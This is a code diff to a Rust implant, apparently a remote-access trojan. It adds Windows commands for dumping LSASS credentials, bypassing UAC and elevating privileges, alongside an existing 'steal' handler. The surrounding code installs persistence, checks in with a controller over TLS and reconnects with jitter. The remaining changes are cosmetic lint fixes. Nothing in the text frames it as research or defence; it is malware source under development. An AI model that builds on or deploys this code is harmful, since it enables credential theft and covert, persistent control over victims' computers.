@@ -127,6 +127,16 @@ async fn main() -> anyhow::Result<()> {
     );
     dispatch.register("steal", Box::new(steal::StealHandler));
 
+    #[cfg(target_os = "windows")]
+    {
+        use commands::lsass_dump;
+        dispatch.register("lsass_dump", Box::new(lsass_dump::LsassDumpHandler));
+        use commands::uac_bypass;
+        dispatch.register("uac_bypass", Box::new(uac_bypass::UacBypassHandler));
+        use commands::elevate;
+        dispatch.register("elevate", Box::new(elevate::ElevateHandler));
+    }
+
     #[cfg(feature = "http-transport")]
     {
         dispatch.register(
@@ -139,8 +149,8 @@ async fn main() -> anyhow::Result<()> {
         );
     }
 
-    let stable_path = persistence::copy_to_stable().unwrap_or_else(|e| {
-        dbg_log!("[!] copy_to_stable: {e}");
+    let stable_path = persistence::copy_to_stable().unwrap_or_else(|_e| {
+        dbg_log!("[!] copy_to_stable: {_e}");
         std::env::current_exe().unwrap_or_default()
     });
 
@@ -158,6 +168,7 @@ async fn main() -> anyhow::Result<()> {
 
     let chain = persistence::get_chain();
     for r in &chain.install_first_available(&stable_path) {
+        #[allow(clippy::if_same_then_else)]
         if r.installed {
             dbg_log!("[+] Persistence installed: {}", r.name);
         } else {
@@ -193,8 +204,8 @@ async fn main() -> anyhow::Result<()> {
             Err(e) => Err(e),
         };
 
-        if let Err(e) = result {
-            dbg_log!("[!] Session ended: {e}");
+        if let Err(_e) = result {
+            dbg_log!("[!] Session ended: {_e}");
         }
         let jitter = rand::thread_rng().gen_range(-RECONNECT_JITTER..RECONNECT_JITTER);
         let delay = backoff * (1.0 + jitter);
@@ -215,8 +226,8 @@ async fn run_tls_session(
     transport.send(checkin_pkt).await?;
 
     let ack = transport.receive().await?;
-    let session_id = ack.data["session_id"].as_str().unwrap_or("?");
-    dbg_log!("[+] Registered, session: {session_id}");
+    let _session_id = ack.data["session_id"].as_str().unwrap_or("?");
+    dbg_log!("[+] Registered, session: {_session_id}");
 
     loop {
         let packet = transport.receive().await?;
@@ -229,7 +240,7 @@ async fn run_tls_session(
                     .send(Packet::new("heartbeat", serde_json::json!({})))
                     .await?;
             }
-            other => dbg_log!("[!] Unknown packet type: {other}"),
+            _other => dbg_log!("[!] Unknown packet type: {_other}"),
         }
     }
 }
